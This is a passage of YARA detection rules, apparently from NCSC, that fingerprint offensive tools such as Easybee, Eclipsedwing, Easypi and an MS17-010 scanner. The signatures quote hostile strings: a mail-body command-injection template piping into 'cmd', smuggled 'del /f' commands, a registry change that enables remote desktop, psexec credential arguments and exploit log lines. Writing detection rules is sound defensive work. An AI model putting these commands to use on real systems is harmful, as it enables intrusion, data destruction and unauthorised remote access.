   meta:
      description = "Easybee-1.0.1.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "59c17d6cb564edd32c770cd56b5026e4797cf9169ff549735021053268b31611"
   strings:
      $x1 = "<Process Type=\"text\"><![CDATA[cmd /c \"type $MESSAGE$ | findstr /b @@ | cmd /v\"]]></Process>" fullword ascii /* PEStudio Blacklist: strings */ /* score: '43.00'*/
      $x2 = "Attn=&Company=&From=&Reply-To=&To=%s@%s&CC=&BCC=&Subject=%s&Body=@@findstr+/mc:\"%s\"+..\\Users\\%s\\%s\\*.msg+|+sort+/O+temp.da" ascii /* PEStudio Blacklist: strings */ /* score: '40.50'*/
      $x3 = "@@for+/f+\"delims=\" %%i+in+('findstr+/smc:\"%s\"+*.msg')+do+if not \"%%MsgFile%%\"==\"%%i\" del /f \"%%i\"" fullword ascii /* score: '40.01'*/
      $x4 = "%s://%s:%s/WorldClient.dll?Session=%s&View=Logout" fullword ascii /* PEStudio Blacklist: strings */ /* score: '39.50'*/
      $x5 = "%s://%s:%s/WorldClient.dll?Session=%s&View=Compose&ComposeInNewWindow=Yes&ChangeView=No&SendNow=Yes" fullword ascii /* score: '38.50'*/
      $x6 = "%s://%s:%s/configfile_view.wdm?postXML=1&file=\\WorldClient\\Dictionary.txt" fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.50'*/
      $x7 = "%s://%s:%s/WorldClient.dll?Session=%s&View=Message&Source=Yes&Number=%s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.50'*/
      $x8 = "@@for /f \"delims=\" %%i in ('findstr /smc:\"%s\" *.msg') do if not \"%%MsgFile1%%\"==\"%%i\" del /f \"%%i\"" fullword ascii /* score: '36.00'*/
      $x9 = "%s://%s:%s/WorldClient.dll?Session=%s&View=Compose-Attach&ComposeID=%s" fullword ascii /* score: '34.50'*/
      $x10 = "%s://%s:%s/WorldClient.dll?Session=%s&View=Compose&New=Yes" fullword ascii /* score: '33.50'*/
      $x11 = "@@for+/f+\"delims=\" %%i+in+('findstr+/smb+@@+*.msg')+do+if not \"%%MsgFile%%\"==\"%%i\" del /f \"%%i\"" fullword ascii /* score: '33.01'*/
      $x12 = "%s://%s:%s/useredit_autoresp.wdm?accountedit=1&user=%s@%s&postXML=1" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.50'*/
      $x13 = "Redirection to main.wdm was not found.  Login may have failed." fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x14 = "%s://%s:%s/configfile_view.wdm?file=\\WorldClient\\Dictionary.txt" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.50'*/
      $x15 = "@@findstr+/mc:\"%s\"+*.msg+|+sort+/O+temp.dat" fullword ascii /* score: '31.00'*/
      $x16 = "Logging out of WebAdmin (as target account)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $x17 = "Error: The number of trigger email should not increase more than pass-through emails. (%d, %d)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.50'*/
      $x18 = "Attn=&Company=&From=&Reply-To=&To=%s@%s&CC=&BCC=&Subject=%s&Body=@@del /f CFilter.ini" fullword ascii /* score: '30.00'*/
      $x19 = "Error: pcre_exec() reported an error (%d)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $x20 = "Error: initializeConnection() was passed a non-NULL headers parameter." fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 200KB and
        pe.imphash() == "df9cce41f0e0ca70dd535c2414add92e" and
        ( 1 of ($x*) )
      ) or ( all of them )
}

rule NCSC_CheckAccount__3_ {
   meta:
      description = "CheckAccount (3).exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "1dbb075d15830ae6fae74656e31efcf477a8b3a70abb3d1b28430322341499d7"
   strings:
      $x1 = "CheckAccount.exe" fullword wide /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $s2 = "System.Windows.Forms.Form.Dispose" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s3 = "txtPasswords" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00'*/
      $s4 = "parameterizedThreadStart_0" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.00'*/
      $s5 = "isupportInitialize_0" fullword ascii /* PEStudio Blacklist: strings */ /* score: '13.00'*/
      $s6 = "commonDialog_0" fullword ascii /* score: '12.00'*/
      $s7 = "https://{0}/ews/Services.wsdl" fullword wide /* score: '12.00'*/
      $s8 = "Text files|*.txt" fullword wide /* score: '12.00'*/
      $s9 = "Connections:" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s10 = "CheckAccount" fullword ascii /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s11 = "txtAccounts" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s12 = "lblConnections" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s13 = "nudConnections" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s14 = "saveFileDialog_0" fullword ascii /* score: '10.00'*/
      $s15 = "fileDialog_0" fullword ascii /* score: '9.00'*/
      $s16 = "icredentials_0" fullword ascii /* score: '9.00'*/
      $s17 = "btnStart_Click" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.00'*/
      $s18 = "6.10.0.218" fullword ascii /* score: '9.00'*/
      $s19 = "methodInvoker_0" fullword ascii /* score: '8.00'*/
      $s20 = "stringComparison_0" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 60KB and
        ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule NCSC_ipgetter {
   meta:
      description = "ipgetter.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "86c9fd3f3b23b4f97951c3ad71ab0f45da2cd6a09b68f640383c470747d6c2c8"
   strings:
      $x1 = "C:\\Users\\NEO\\Documents\\Visual Studio 2010\\Projects\\ipgetter\\ipgetter\\obj\\x86\\Debug\\ipgetter.pdb" fullword ascii /* PEStudio Blacklist: strings */ /* score: '55.00'*/
      $s2 = "ipgetter.exe" fullword wide /* score: '27.00'*/
      $s3 = "ipgetter.Properties.Resources.resources" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s4 = "ipgetter.frmip.resources" fullword ascii /* PEStudio Blacklist: strings */ /* score: '19.00'*/
      $s5 = "ipgetter.Properties.Resources" fullword wide /* PEStudio Blacklist: strings */ /* score: '19.00'*/
      $s6 = "btnimport" fullword wide /* PEStudio Blacklist: strings */ /* score: '16.00'*/
      $s7 = "all fields imported!" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.00'*/
      $s8 = "Important Question" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.00'*/
      $s9 = "ipgetter.Properties" fullword ascii /* score: '13.00'*/
      $s10 = "Import List" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s11 = "btnimport_Click" fullword ascii /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s12 = "btnstart" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s13 = "ipgetter" fullword wide /* score: '12.00'*/
      $s14 = "(*.txt)|*.txt" fullword wide /* score: '11.00'*/
      $s15 = "Ip Getter" fullword wide /* score: '9.00'*/
      $s16 = "<request>b__1" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.00'*/
      $s17 = "<request>b__3" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.00'*/
      $s18 = "<request>b__2" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.00'*/
      $s19 = "<request>b__4" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.00'*/
      $s20 = "btnstart_Click" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 100KB and
        ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule NCSC_CheckAccount_5_0 {
   meta:
      description = "CheckAccount 5.0.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "0c83b8d6b10bc9b11d798adce5b6701bbf0151b05dc20505d5e9eefaee16d599"
	  score = 70
   strings:
      $x1 = "MultiResponseServiceRequest.Execute" fullword wide /* PEStudio Blacklist: strings */ /* score: '36.00'*/
      $x2 = "YTryGetPartnerAccess only supports {0} or a later version in Microsoft-hosted data center." fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $x3 = "http://schemas.microsoft.com/Passport/SoapServices/SOAPFault" fullword wide /* PEStudio Blacklist: strings */ /* score: '34.00'*/
      $x4 = "The UserId in the folder permission at index {0} is invalid. The StandardUser, PrimarySmtpAddress, or SID property must be set." fullword ascii /* PEStudio Blacklist: strings */ /* score: '34.00'*/
      $x5 = "lThe UserId in the DelegateUser is invalid. The StandardUser, PrimarySmtpAddress or SID property must be set." fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x6 = "ExchangeServiceBase.InternalProcessHttpErrorResponse" fullword wide /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $x7 = "CheckAccount.exe" fullword wide /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $s8 = "InternalProcessHttpErrorResponse does not handle 500 ISE errors, the caller is supposed to handle this." fullword wide /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s9 = "ComplexPropertyCollection.ItemChanged: the type of the complexProperty argument ({0}) is not supported." fullword wide /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s10 = "0The time zone transition target isn't supported." fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s11 = "ErrorPublicFolderRequestProcessingFailed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s12 = "ServiceErrorHandling.ThrowOnError error handling is only valid for singleton request" fullword wide /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s13 = "SCan't set both impersonated user and privileged user in the ExchangeService object." fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s14 = "http://schemas.microsoft.com/exchange/services/2006/messages" fullword wide /* score: '26.00'*/
      $s15 = "http://schemas.microsoft.com/exchange/services/2006/errors" fullword wide /* score: '26.00'*/
      $s16 = "http://schemas.microsoft.com/exchange/services/2006/types" fullword wide /* score: '26.00'*/
      $s17 = "`The item type returned by the service ({0}) isn't compatible with the requested item type ({1})." fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s18 = "UnsupportedTimeZonePeriodTransitionTarget" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s19 = "ErrorProxyRequestProcessingFailed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s20 = "}The IAsyncResult object was not returned from the corresponding asynchronous method of the original ExchangeService object.  " fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 1000KB and
        ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule NCSC_Educatedscholar_1_0_0 {
   meta:
      description = "Educatedscholar-1.0.0.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "4cce9e39c376f67c16df3bcd69efd9b7472c3b478e2e5ef347e1410f1105c38d"
   strings:
      $x1 = "[-] Userspace payload build failed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00'*/
      $x2 = "[+] Shellcode Callback %s:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.50'*/
      $x3 = "[+] Target %s:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.50'*/
      $x4 = "[-] Could not send exploit packet to target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00'*/
      $x5 = "[-] Kernel payload build failed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $s6 = "[-] Could not send increment packet to target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s7 = "[-] Exploit payload build failed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s8 = "[-] WriteTargetMemory failed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s9 = "[+] Exploiting Target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s10 = "[+] Payload size: %d (0x%x) bytes" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s11 = "[+] Building userspace component" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s12 = "[-] BuildExploitPayload failed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s13 = "[-] BuildWritePayload failed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s14 = "[-] Could not connect to target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s15 = "[+] Connection received on listening socket" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s16 = "[*] Writing Target Memory" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s17 = "[-] Failed to get %d byte authcode" fullword ascii /* score: '25.00'*/
      $s18 = "[-] Failed to get Remote and Local Callback Ports" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s19 = "[*] Exploit Completed Successfully" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s20 = "[+] Building exploit payload" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 60KB and
        pe.imphash() == "b6c04ac2fb7e4cb3b48f73b1f94b39e9" and
        ( 1 of ($x*) or 4 of them )
      ) or ( all of them )
}

rule NCSC_guest_x86 {
   meta:
      description = "guest.x86.bin"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "aa5e6afa414bb7ebb1152aa55923b737be08411003f4d3b76cb7774dd89cbda9"
   strings:
      $x1 = "cmd /c reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0x0 /f & " ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $s2 = "ZXXYQQQ" fullword ascii /* score: '5.50'*/
   condition:
      ( uint16(0) == 0xe860 and
        filesize < 3KB and
        ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule NCSC_Eclipsedwing_1_5_2 {
   meta:
      description = "Eclipsedwing-1.5.2.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "48251fb89c510fb3efa14c4b5b546fbde918ed8bb25f041a801e3874bd4f60f8"
   strings:
      $x1 = "[-] Reading Implant Payload '%s' failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00'*/
      $x2 = "[+] Target is %s:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.50'*/
      $x3 = "[+] Target exploitation complete" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00'*/
      $x4 = "[+] Target primer complete" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $s5 = "[*] Exploiting target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s6 = "[-] Post exploit select() failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s7 = "[-] Failed to Prepare Payload!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s8 = "[-] Failed to receive a callback from target!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s9 = "[+] Target not NX capable." fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s10 = "[-] CallintoTarget() failed to connect" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s11 = "[*] Calling in to listener on target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s12 = "[*] Connecting to listener" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.01'*/
      $s13 = "[*] Priming target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s14 = "[-] Params_getCallbackPortValues() failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s15 = "ShellcodeStartOffset" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s16 = "ShellcodeStartValue" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s17 = "GetExecutionToBufferOffset2" fullword ascii /* score: '24.00'*/
      $s18 = "[-] InitializeExploitSocket() failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s19 = "[*] Waiting for AuthCode from exploit" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s20 = "GetExecutionToBufferOffset" fullword ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 100KB and
        pe.imphash() == "19916ab84dbb68ca7713a54c37348620" and
        ( 1 of ($x*) or 4 of them )
      ) or ( all of them )
}

rule NCSC_katz {
   meta:
      description = "katz.js"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "c27382fd82bd4af92905144b6b219c3b75cb001081f9ae683115d50d2df8382a"
   strings:
      $s1 = "var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s2 = "var al = new ActiveXObject('System.Collections.ArrayList')" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s3 = "114,105,116,121,46,80,101,114,109,105,115,115,105,111,110,115,0,83,101,99,117,114,105,116,121,80,101,114,109,105,115,115," fullword ascii /* score: '18.00'*/
      $s4 = "116,105,110,103,83,121,115,116,101,109,86,101,114,115,105,111,110,0,77,105,110,111,114,79,112,101,114,97,116,105,110,103," fullword ascii /* score: '18.00'*/
      $s5 = "68,101,108,101,103,97,116,101,83,101,114,105,97,108,105,122,97,116,105,111,110,72,111,108,100,101,114,43,68,101,108,101," fullword ascii /* score: '18.00'*/
      $s6 = "116,101,109,46,68,101,108,101,103,97,116,101,83,101,114,105,97,108,105,122,97,116,105,111,110,72,111,108,100,101,114,43," fullword ascii /* score: '18.00'*/
      $s7 = "121,115,116,101,109,46,67,111,109,112,111,110,101,110,116,77,111,100,101,108,0,82,117,110,73,110,115,116,97,108,108,101," fullword ascii /* score: '18.00'*/
      $s8 = "101,99,117,114,105,116,121,80,101,114,109,105,115,115,105,111,110,65,116,116,114,105,98,117,116,101,44,32,109,115,99,111," fullword ascii /* score: '18.00'*/
      $s9 = "83,101,114,105,97,108,105,122,97,116,105,111,110,72,111,108,100,101,114,43,68,101,108,101,103,97,116,101,69,110,116,114," fullword ascii /* score: '18.00'*/
      $s10 = "108,101,103,97,116,101,83,101,114,105,97,108,105,122,97,116,105,111,110,72,111,108,100,101,114,43,68,101,108,101,103,97," fullword ascii /* score: '18.00'*/
      $s11 = "var stm = new ActiveXObject('System.IO.MemoryStream');" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00'*/
      $s12 = "99,101,112,116,105,111,110,84,97,98,108,101,0,67,101,114,116,105,102,105,99,97,116,101,84,97,98,108,101,0,66,97," fullword ascii /* score: '17.00'*/
      $s13 = "110,97,116,117,114,101,10,77,101,109,98,101,114,84,121,112,101,16,71,101,110,101,114,105,99,65,114,103,117,109,101,110," fullword ascii /* score: '17.00'*/
      $s14 = "121,116,101,115,0,77,101,109,111,114,121,83,116,114,101,97,109,0,114,101,97,100,101,114,0,82,101,97,100,66,121,116," fullword ascii /* score: '17.00'*/
      $s15 = "0,0,0,39,83,121,115,116,101,109,46,82,101,102,108,101,99,116,105,111,110,46,65,115,115,101,109,98,108,121,32,76," fullword ascii /* score: '17.00'*/
      $s16 = "86,101,114,115,105,111,110,0,77,105,110,111,114,83,117,98,115,121,115,116,101,109,86,101,114,115,105,111,110,0,87,105," fullword ascii /* score: '17.00'*/
      $s17 = "97,108,105,122,101,100,68,97,116,97,0,83,105,122,101,79,102,85,110,105,110,105,116,105,97,108,105,122,101,100,68,97," fullword ascii /* score: '17.00'*/
      $s18 = "101,84,104,114,101,97,100,0,87,97,105,116,70,111,114,83,105,110,103,108,101,79,98,106,101,99,116,0,79,114,105,103," fullword ascii /* score: '17.00'*/
      $s19 = "115,115,97,103,101,0,103,101,116,95,73,110,110,101,114,69,120,99,101,112,116,105,111,110,0,90,101,114,111,0,85,73," fullword ascii /* score: '17.00'*/
      $s20 = "67,104,97,114,97,99,116,101,114,105,115,116,105,99,115,0,83,105,122,101,79,102,83,116,97,99,107,82,101,115,101,114," fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x760a and
        filesize < 15000KB and
        ( 8 of them )
      ) or ( all of them )
}

rule NCSC_DiskSpace2 {
   meta:
      description = "DiskSpace2.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "84803151c5b73a53de91844968f377e6ee33ba82910aa1f612595a19aeb7e529"
   strings:
      $s1 = "DiskSpace.exe" fullword wide /* score: '22.00'*/
      $s2 = "ps.exe" fullword wide /* score: '18.00'*/
      $s3 = "ps.exe -nobanner \\\\" fullword wide /* score: '16.42'*/
      $s4 = " wmic logicaldisk get name, size, freespace > " fullword wide /* score: '14.00'*/
      $s5 = "cmd.cmd" fullword wide /* score: '14.00'*/
      $s6 = "-u {0} -p {1}{2}" fullword wide /* score: '13.00'*/
      $s7 = "psexec6" fullword wide /* score: '12.00'*/
      $s8 = "output.csv" fullword wide /* score: '10.00'*/
      $s9 = "ip.txt" fullword wide /* score: '10.00'*/
      $s10 = "get_Freespace" fullword ascii /* score: '9.01'*/
      $s11 = "Copyright (C) 2001-2016 Mark Russinovich" fullword wide /* score: '8.00'*/
      $s12 = "R`=\"%P%" fullword ascii /* score: '7.00'*/
      $s13 = "<Freespace>k__BackingField" fullword ascii /* score: '6.00'*/
      $s14 = "UT.TgB}" fullword ascii /* score: '6.00'*/
      $s15 = "ukeY-H" fullword ascii /* score: '6.00'*/
      $s16 = "<Ip>k__BackingField" fullword ascii /* score: '5.00'*/
      $s17 = "20160628184324.664Z0" fullword ascii /* score: '5.00'*/
      $s18 = "20160629165800Z0t0:" fullword ascii /* score: '5.00'*/
      $s19 = "20160629165722Z0s09" fullword ascii /* score: '5.00'*/
      $s20 = "\\DiskSpace\\" fullword wide /* score: '5.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 700KB and
        ( 8 of them )
      ) or ( all of them )
}

rule NCSC_Easypi_3_1_0 {
   meta:
      description = "Easypi-3.1.0.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "dc1ddad7e8801b5e37748ec40531a105ba359654ffe8bdb069bd29fb0b5afd94"
   strings:
      $x1 = "[-] %s - Target might not be in a usable state." fullword ascii /* PEStudio Blacklist: strings */ /* score: '38.00'*/
      $x2 = "[-] Timed out waiting for target to close our connection.  Target may be in a weird state." fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00'*/
      $x3 = "[+] Target connection state cleaned up." fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00'*/
      $x4 = "[*] Continuing, connection not accepted by target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00'*/
      $s5 = "[*] Cleaning up target connection state" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s6 = "[*] Waiting for up to %d seconds for Authcode from exploit" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s7 = "[*] Finshed Prepping Target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s8 = "[*] Exploiting Target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s9 = "[-] Encoding Exploit Payload failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s10 = "[*] Prepping Target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s11 = "[*] Prepping Targets" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s12 = "[*] Socket re-creation failed preparing for exploit packet: %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s13 = "[+] Connecting to %s:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.50'*/
      $s14 = "[*] WARNING: Egg 1 is in memory on remote host!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX" fullword ascii /* score: '22.50'*/
      $s16 = "[*] Running Exploit" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s17 = "[+] Starting Handshake for Egg0 + Overflow" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s18 = "[*] Was not able to establish initial connections" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s19 = "tibe-1.dll" fullword ascii /* score: '20.00'*/
      $s20 = "adfw-2.dll" fullword ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 60KB and
        pe.imphash() == "5e43f913a2a216e8ad2f7a2da93cd14a" and
        ( 1 of ($x*) or 4 of them )
      ) or ( all of them )
}

rule NCSC_single {
   meta:
      description = "single.py"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "6dd5f84eb088dc7f908a14f386425fd54d2c437b0067e254ebe5cab527560488"
   strings:
      $x1 = "print(\"[+] \"+str(targets)+\" is likely VULNERABLE to MS17-010  (\"+nativeos+\")\")" fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.00'*/
      $x2 = "share += \"\\x5c\\x5c\"+iptarget+\"\\x5c\\x49\\x50\\x43\\x24\\x00\" # Path: \\\\ip_target\\IPC$" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x3 = "## SMB Command: Session Setup AndX Request, User: .\\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $s4 = "packetsession += \"\\x73\" # SMB Command: Session Setup AndX (0x73)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s5 = "share += \"\\x75\" # SMB Command: Tree Connect AndX (0x75)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s6 = "smbpipefid0 += \"\\x00\\x00\" # Process ID High 0" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s7 = "packetsession += \"\\x00\\x00\" # Process ID High 0" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s8 = "smbpipefid0 += \"\\x25\" # SMB Command: Trans (0x25)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s9 = "smbpipefid0 += \"\\x5c\\x50\\x49\\x50\\x45\\x5c\\x00\" # Transaction Name: \\PIPE\\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s10 = "packetsession += \"\\xff\" # AndXCommand: No further commands (0xff)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s11 = "share += \"\\x00\" # Password: 00" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s12 = "packetnego += \"\\x72\" # SMB Command: Negotiate Protocol (0x72)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s13 = "share += \"\\xff\" # AndXCommand: No further commands (0xff)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s14 = "# Get Native OS from Session Setup AndX Response" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s15 = "smbpipefid0 += \"\\x23\\x00\" # Function: PeekNamedPipe (0x0023)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s16 = "smbpipefid0 += \"\\x00\\x00\"# Error Code: No Error" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s17 = "packetnego += \"\\x00\\x00\" # Process ID High 0" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s18 = "## PeekNamedPipe Request, FID: 0x0000" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s19 = "packetnego += \"\\x44\\x6d\" # Process ID 27972" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s20 = "share += \"\\x00\\x00\" # Process ID High 0" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
   condition:
      ( uint16(0) == 0x2123 and
        filesize < 20KB and
        ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule NCSC_shellcode {
   meta:
      description = "shellcode.rar"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "f1c3dc6c7acf185b92343162655ac9ba4ef5e320ed1f917fb0ee734dc9ca529b"
   strings:
      $s1 = "guest.all.bin" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s2 = "guest.x86.bin" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00'*/
      $s3 = "guest.x64.bin" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x6152 and
        filesize < 10KB and
        ( all of them )
      ) or ( all of them )
}

rule NCSC_Erraticgopher_1_0_1 {
   meta:
      description = "Erraticgopher-1.0.1.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
